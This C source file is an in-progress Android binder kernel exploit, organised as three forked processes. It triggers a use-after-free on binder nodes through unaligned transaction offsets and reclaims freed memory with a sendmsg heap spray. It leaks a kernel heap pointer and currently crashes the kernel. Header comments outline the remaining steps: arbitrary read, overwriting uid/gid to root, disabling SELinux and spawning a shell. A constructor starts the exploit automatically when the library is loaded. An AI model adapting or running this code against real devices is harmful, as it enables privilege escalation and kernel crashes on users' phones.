#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"
#include "token_manager.h"


// Exploit plan:
// Spray messages back and forth, to get fragmented binder allocator
//   TODO: figure out how to do this
//
// UAF on many binder nodes
//
// Then cross cache attack with epitem
//   allocate 2 epitem per fd, try to leak first one to get leak on file and second epitem
//
// UAF on binder node, reclaim with binder ref referencing another node
//   read dangling message to leak other node
//
// UAF on other node we leaked
//   reclaim with fake msg_msg which will overwrite
//   msg_msg will have linked list setup to unlink overwrite one of file inode pointers to epitem
//
// Now arbitrary read is set up
//   leak file f_ops vtable pointer from known address
//   traverse process list with arb read to find target process
//
// perform unlink setup more times
//   overwrite uid and gid to 0
//   set selinux.enforcing to 0
//
// exec shell

struct list_head { 
    struct list_head *next, *prev; 
}; 

struct hlist_head { 
    struct hlist_node *first; 
}; 

struct hlist_node { 
    struct hlist_node *next, **pprev; 
};

struct rb_node {
    unsigned long  __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct binder_work {
    struct list_head entry;

    enum binder_work_type {
        BINDER_WORK_TRANSACTION = 1,
        BINDER_WORK_TRANSACTION_COMPLETE,
        BINDER_WORK_TRANSACTION_ONEWAY_SPAM_SUSPECT,
        BINDER_WORK_RETURN_ERROR,
        BINDER_WORK_NODE,
        BINDER_WORK_DEAD_BINDER,
        BINDER_WORK_DEAD_BINDER_AND_CLEAR,
        BINDER_WORK_CLEAR_DEATH_NOTIFICATION,
    } type;
};

struct binder_node {
	int debug_id;
	//spinlock_t lock;
    // TODO: figure out if this is correct (should be based on offset of ptr and cookie)
    u32 lock;
	struct binder_work work;
	union {
		struct rb_node rb_node;
		struct hlist_node dead_node;
	};
	struct binder_proc *proc;
	struct hlist_head refs;
	int internal_strong_refs;
	int local_weak_refs;
	int local_strong_refs;
	int tmp_refs;
    // Offset 88 and 96
	binder_uintptr_t ptr;
	binder_uintptr_t cookie;
	struct {
		/*
		* bitfield elements protected by
		* proc inner_lock
		*/
		u8 has_strong_ref:1;
		u8 pending_strong_ref:1;
		u8 has_weak_ref:1;
		u8 pending_weak_ref:1;
	};
	struct {
		/*
		* invariant after initialization
		*/
		u8 sched_policy:2;
		u8 inherit_rt:1;
		u8 accept_fds:1;
		u8 txn_security_ctx:1;
		u8 min_priority;
	};
	bool has_async_transaction;
	struct list_head async_todo;
};


typedef struct {
    // fd for send and receive ends of pipe for sending commands to b
    int send_command_pipe;
    int recv_command_pipe;

    // fd for send and receive ends of pipe for receiving responses from b
    int send_response_pipe;
    int recv_response_pipe;
} CommandPipe;

void command_pipe_init(CommandPipe *command_pipe) {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));

    command_pipe->send_command_pipe = fds[1];
    command_pipe->recv_command_pipe = fds[0];

    SYSCHK(pipe(fds));
    command_pipe->send_response_pipe = fds[1];
    command_pipe->recv_response_pipe = fds[0];
}

typedef struct {
    CommandPipe b_pipe;
    CommandPipe c_pipe;
    CommandPipe d_pipe;

    // token of a
    // b will look in token manager for this token to get a binder reference to a's control node
    struct token a_token;

    // syncronise a and c for after A finishes registering with token manager
    pthread_barrier_t a_register_done;
} ExploitCtx;

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));

    command_pipe_init(&ctx->b_pipe);
    command_pipe_init(&ctx->c_pipe);
    command_pipe_init(&ctx->d_pipe);

    init_shared_barrier(&ctx->a_register_done, 2);
}

typedef enum {
    // b commands
    UAF_NODE,

    // c commands
    RECV_NODE,
    RESET_CONTEXT,
} CommandType;

typedef struct {
    binder_uintptr_t base_id;
    u64 node_count;
} UafNodeArgs;

typedef struct {
    CommandType command_type;
    u32 body_size;
} PipeCommandHeader;

typedef struct {
    PipeCommandHeader header;
    void *data;
} PipeCommand;

void send_pipe_command(CommandPipe *ctx, PipeCommand *command) {
    write(ctx->send_command_pipe, &command->header, sizeof(PipeCommandHeader));
    if (command->data) {
        write(ctx->send_command_pipe, command->data, command->header.body_size);
    }
}

// sends only a command type with no body
void send_pipe_command_type(CommandPipe *ctx, CommandType command_type) {
    PipeCommand command = {
        .header = {
            .command_type = command_type,
            .body_size = 0,
        },
        .data = NULL,
    };

    send_pipe_command(ctx, &command);
}

PipeCommand recv_pipe_command(CommandPipe *ctx) {
    PipeCommand out = { 0 };
    read(ctx->recv_command_pipe, &out.header, sizeof(PipeCommandHeader));

    if (out.header.body_size > 0) {
        out.data = calloc(out.header.body_size, sizeof(u8));
        read(ctx->recv_command_pipe, out.data, out.header.body_size);
    } else {
        out.data = NULL;
    }

    return out;
}

void pipe_command_drop(PipeCommand command) {
    if (command.data) {
        free(command.data);
    }
}

typedef enum {
    COMMAND_OK,
    COMMAND_ERROR,
} PipeCommandResponse;

void send_command_response(CommandPipe *ctx, PipeCommandResponse response) {
    assert(write(ctx->send_response_pipe, &response, sizeof(PipeCommandResponse)) == sizeof(PipeCommandResponse));
}

void await_response(CommandPipe *ctx) {
    PipeCommandResponse response = COMMAND_ERROR;
    read(ctx->recv_response_pipe, &response, sizeof(PipeCommandResponse));
    if (response != COMMAND_OK) {
        panic("Received error response from process B");
    }
}

typedef struct {
    ExploitCtx *ctx;
    binder_client_t binder;
    u32 c_handle;
    // when local context passed to new thread, this instructe new thread id of node to allocate
    binder_uintptr_t allocate_node_id;
} LocalCtx;

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count);

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

#define VULN_BINDER 1337

// sends a node with the given node number to the recepient process
void send_node(binder_client_t *binder, u32 remote_handle, binder_uintptr_t node_num, bool read_reponse) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, TF_ONE_WAY);
    binder_txn_add_binder_object(txn, node_num, 0x69696969);

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);

    // receive response for transaction (don't do anything with it)
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    if (read_reponse) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
    }
    // void *thing = NULL;
    // TODO: figure out if there is some transaction buffer we have to free when reading response
    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_INCREFS, &thing);
    // if (ret == 0) {
    //     binder_increfs_done(binder->fd, node_num, 0x69696969);
    // }

    // ret = binder_read_buffer_lookup(read_buf, read_amount, BR_ACQUIRE, &thing);
    // if (ret == 0) {
    //     binder_acquire_done(binder->fd, node_num, 0x69696969);
    // }
}

// receives a handle to a node
u32 recv_strong_handle(binder_client_t *binder, u64 reply_handle) {
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        // binder_read_buffer_dump(read_buf, read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("rev_strong_handle: skipping read result with no transaction");
        } else {
            break;
        }
    }

    // LOGD("recv strong handle, node id: %llu, node cookie: %llu", txn->target.ptr, txn->cookie);

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);
            binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);

            // read transaction complete command
            char read_buf[128] = { 0 };

            // if reply handle is not -1, use it for reply
            // u32 reply_handle_real = reply_handle == -1 ? handle : (u32) reply_handle;
            // struct binder_txn *response = binder_txn_create(reply_handle_real, 0, 0);
            // binder_txn_dispatch(response, binder->fd, true, &read_buf, sizeof(read_buf), NULL);
            // binder_txn_destroy(response);

            return handle;
        }
    }

    panic("No handle found");
}

void allocate_node(LocalCtx *ctx, binder_uintptr_t node_id, bool read_reponse) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RECV_NODE);
    send_node(&ctx->binder, ctx->c_handle, node_id, read_reponse);
    await_response(&ctx->ctx->c_pipe);
}

void reset_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RESET_CONTEXT);
    await_response(&ctx->ctx->c_pipe);
}

#define NUM_SPRAY 16

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with 
u8 payload[128] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        SYSCHK(close(spray_sockets[i][0]));
        SYSCHK(close(spray_sockets[i][1]));
    }

    SYSCHK(close(control_socket[0]));
    SYSCHK(close(control_socket[1]));
}

void *allocate_node_thread(void *ctx_void) {
    pin_to_cpu(0);
    LocalCtx *ctx = (LocalCtx *) ctx_void;
    allocate_node(ctx, ctx->allocate_node_id, false);
    return NULL;
}

void do_a(LocalCtx *ctx) {
    setup_spray();

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    usize leak_addr = 0;
    // fixme: multiple iterations don't work, it will hang second iteration cause B doesn't receive nodes for some reason
    usize iteration = 0;
    for (;;) {
        uaf_nodes(ctx, 1337 + iteration, 1);

        // we need to allocate node to reclaim UAF node with ref
        // issue is if we allocate node, when we read in message pointing to freed node to get leak, we will
        // read in message acknowledging refcount incrament, which will put node in state where it can be later UAF
        // this is because this workqueue item goes per thread and the async message goes in a list
        // which is read later (so this refcount message will be read first)
        // so we spawn a new thread to do the work, and the workqueue item will go to that thread
        // and it will never read it, so it is possible to UAF node
        pthread_t node_thread = 0;
        // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
        // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
        pin_to_cpu(1);
        SYSCHK(pthread_create(&node_thread, 0, allocate_node_thread, ctx));
        SYSCHK(pthread_join(node_thread, NULL));
        pin_to_cpu(0);

        LOGD("================ UAF ================");
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        LOGD("read length: %llu", read_amount);
        binder_read_buffer_dump(read_buf, read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

        // if target value looks like heap pointer, go next
        if (response->target.ptr >= 0xffffff8000000000) {
            leak_addr = response->target.ptr;
            break;
        } else {
            // avoid allocating excesive amount of nodes
            reset_process_c(ctx);
        }

        iteration++;
    }

    binder_uintptr_t leaked_node = 80000 + iteration;
    LOGD("================ LEAK ================");
    LOGD("Got leak on binder node %d: %p\n\n", leaked_node, leak_addr);

    // set up payload to spray
    usize list_offset = offsetof(struct binder_node, work);
    struct binder_node *node = (struct binder_node *) payload;
    node->work.entry.next = leak_addr + list_offset;
    node->dead_node.next = (struct hlist_node *) 0x69696960;
    node->dead_node.pprev = (struct hlist_node **) 0x69696900;
    node->cookie = 123456789;
    node->ptr = 987654321;

    // now uaf the node we know its address
    uaf_nodes(ctx, leaked_node, 1);
    reset_process_c(ctx);

    // reclaim freed node
    do_spray();

    LOGD("================ UAF2 ================");
    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    LOGD("read length: %llu", read_amount);
    binder_read_buffer_dump(read_buf, read_amount);
    struct binder_transaction_data *response = NULL;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
    if (ret < 0) {
        panic("Didn't receive response");
    }

    LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

    LOGD("Crashing kernel...");
    // Currently crash is not due to unlink
    // I beleive it is crashing due to the transaction being async, which triggers some assertions
    // because node is in invalid state for async transaction
    // it would however later crash if these assertions were not hit
    binder_free_transaction_buffer(ctx->binder.fd, response->data.ptr.buffer);
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;
    binder_client_init(&local_ctx.binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(local_ctx.binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        local_ctx.binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER,
        0,
        &ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    pthread_barrier_wait(&ctx->a_register_done);

    binder_enter_looper(local_ctx.binder.fd);

    local_ctx.c_handle = recv_strong_handle(&local_ctx.binder, -1);
    LOGD("A: received C's handle");

    do_a(&local_ctx);
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count) {
    PipeCommand command = { 0 };
    command.header.command_type = UAF_NODE;
    command.header.body_size = sizeof(UafNodeArgs);

    UafNodeArgs *args = calloc(1, sizeof(UafNodeArgs));
    args->base_id = base_id;
    args->node_count = node_count;
    command.data = args;

    send_pipe_command(&ctx->ctx->b_pipe, &command);
    pipe_command_drop(command);

    u32 b_handle = recv_strong_handle(&ctx->binder, -1);

    for (u64 i = 0; i < node_count; i++) {
        send_node(&ctx->binder, b_handle, base_id + i, false);
    }

    await_response(&ctx->ctx->b_pipe);

    u8 read_buf[128] = { 0 };
    usize read_amount = 0;
    for (u64 i = 0; i < node_count; i++) {
        // 2 reads per UAF node
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        // binder_read_buffer_dump(read_buf, read_amount);
        // binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        // binder_read_buffer_dump(read_buf, read_amount);
    }

    LOGD("A: got uaf on nodes");
}

typedef struct {
    binder_client_t binder;
    u32 a_handle;
    bool active;
} BContext;

void bcontext_deactivate(BContext *bctx) {
    binder_client_destroy(&bctx->binder);
    bctx->active = false;
}

// sets up a connection with a
void acquire_a_handle(ExploitCtx *ctx, BContext *bctx) {
    if (bctx->active) {
        bcontext_deactivate(bctx);
    }

    binder_client_init(&bctx->binder, NULL);
    bctx->active = true;

    u32 token_manager_handle = 0;
    int ret = find_token_manager(bctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        panic("Failed to create binder client");
    }

    ret = token_manager_lookup(
        bctx->binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &bctx->a_handle
    );
    if (ret < 0) {
        panic("Failed to lookup a binder context");
    }

    binder_enter_looper(bctx->binder.fd);

    // send a node for this process to a
    send_node(&bctx->binder, bctx->a_handle, PROCESS_B_BINDER, true);
}

// process b receives commands from a and does actions
void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        LOGD("B: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->b_pipe);

        switch (command.header.command_type) {
            case UAF_NODE: {
                UafNodeArgs *args = (UafNodeArgs *) command.data;
                LOGD("B: got UAF command base id: %llu, count: %lu", args->base_id, args->node_count);

                u32 *refs = calloc(args->node_count, sizeof(u32));
                acquire_a_handle(ctx, &bctx);

                LOGD("B: acquired A handle");

                // TODO: maybe don't receive refs 1 by one, but idt it will mess up exploit
                for (usize i = 0; i < args->node_count; i++) {
                    refs[i] = recv_strong_handle(&bctx.binder, bctx.a_handle);
                    LOGD("B: got ref %u", refs[i]);
                }

                LOGD("B: received handles");

                u8 read_buf[256] = { 0 };
                usize read_amount = 0;

                // send empty message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    // use async transaction so subsequent transactions can still be started
                    struct binder_txn *message = binder_txn_create(refs[i], 0, TF_ONE_WAY);
                    binder_txn_dispatch(message, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(message);

                    // read result
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                }

                LOGD("B: sent fake messages");

                // send vulnerable message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    for (usize j = 0; j < 1; j++) {
                        struct binder_txn *vuln_message = binder_txn_create(refs[i], 0, TF_ONE_WAY);

                        binder_txn_add_binder_object(vuln_message, args->base_id + i, 0);
                        // make offsets unaligned
                        vuln_message->offsets_size += 1;
                        LOGD("B: offset size: %llu", vuln_message->offsets_size);

                        binder_txn_dispatch(vuln_message, bctx.binder.fd, false, NULL, 0, NULL);
                        binder_txn_destroy(vuln_message);

                        // read error code
                        // allows more errors to be setn in future
                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    }
                }

                LOGD("B: triggered invalid refcount decrament");

                // Idt this is necessary, do cause there were some issues before
                // for (usize i = 0; i < args->node_count; i++) {
                //     binder_decrefs(bctx.binder.fd, refs[i]);
                //     binder_release(bctx.binder.fd, refs[i]);
                // }

                // LOGD("B: released refcount on handles");

                // u8 read_buf[4096] = { 0 };
                // usize read_amount = 0;
                // binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                // LOGD("B: read amount: %lu", read_amount);
                // binder_read_buffer_dump(read_buf, read_amount);

                // ioctl(bctx.binder.fd, BINDER_THREAD_EXIT);
                bcontext_deactivate(&bctx);
                free(refs);

                LOGD("B: closed binder context");

                response = COMMAND_OK;
            } break;
            default: {
                LOG("B: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->b_pipe, response);
    }
}

// process C does nothing but exist as a process that process A can send binder nodes to
// we need a recepient process of a ref when allocating binder node
// and process B closes its binder context frequently so another process is needed
void process_c(ExploitCtx *ctx) {
    pin_to_cpu(0);

    pthread_barrier_wait(&ctx->a_register_done);

    BContext bctx = { 0 };
    bctx.active = false;
    acquire_a_handle(ctx, &bctx);

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        LOGD("C: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->c_pipe);

        switch (command.header.command_type) {
            case RECV_NODE: {
                LOGD("C: receiving node...");
                // TODO: figure out if receiving transaction and acknowledging it
                // or just ignroing it is better (less allocations?)
                recv_strong_handle(&bctx.binder, bctx.a_handle);
                response = COMMAND_OK;
            } break;
            case RESET_CONTEXT: {
                bcontext_deactivate(&bctx);
                acquire_a_handle(ctx, &bctx);
                response = COMMAND_OK;
                LOGD("C: reset context");
            } break;
            default: {
                LOG("C: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->c_pipe, response);
    }
}

// void process_d(ExploitCtx *ctx) {
//     pin_to_cpu(0);

//     pthread_barrier_wait(&ctx->a_register_done);

//     BContext bctx = { 0 };
//     bctx.active = false;
//     acquire_a_handle(ctx, &bctx);

//     for (;;) {
//         PipeCommandResponse response = COMMAND_ERROR;

//         LOGD("D: listening for next command...");
//         PipeCommand command = recv_pipe_command(&ctx->d_pipe);

//         switch (command.header.command_type) {
//             default: {
//                 LOG("D: Invalid command recieved");
//             }
//         }

//         pipe_command_drop(command);
//         send_command_response(&ctx->d_pipe, response);
//     }
// }

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    } else if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else if (SYSCHK(fork()) == 0) {
        process_c(ctx);
    } else {
        // process_d(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}